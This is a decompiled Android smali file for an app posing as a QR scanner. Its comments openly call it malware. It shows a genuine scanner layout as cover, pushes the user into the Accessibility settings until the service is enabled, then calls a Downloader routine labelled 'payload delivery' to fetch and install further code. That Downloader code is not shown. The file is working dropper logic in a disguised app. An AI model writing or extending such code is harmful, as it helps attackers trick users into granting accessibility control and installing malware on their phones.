.class public Lcom/android/qr/scanner/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

# Legitimate QR Scanner Interface

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Set real QR Scanner layout
    const/high16 v0, 0x7f040000
    invoke-virtual {p0, v0}, Lcom/android/qr/scanner/MainActivity;->setContentView(I)V

    # Check if Accessibility is enabled
    invoke-direct {p0}, Lcom/android/qr/scanner/MainActivity;->checkAccessibility()Z
    move-result v0
    if-nez v0, :cond_0

    # Guide user to enable Accessibility
    new-instance v0, Landroid/content/Intent;
    const-string v1, "android.settings.ACCESSIBILITY_SETTINGS"
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    invoke-virtual {p0, v0}, Lcom/android/qr/scanner/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_0
    # If Accessibility enabled, start payload delivery
    invoke-static {p0}, Lcom/android/qr/scanner/Downloader;->downloadAndInstall(Landroid/content/Context;)V

    :goto_0
    return-void
.end method

.method private checkAccessibility()Z
    .locals 4
    .line 50
    const/4 v0, 0x0
    const-string v1, "accessibility"
    invoke-virtual {p0, v1}, Lcom/android/qr/scanner/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/view/accessibility/AccessibilityManager;
    
    # Check if our specific service is enabled
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityManager;->isEnabled()Z
    move-result v1
    return v1
.end method
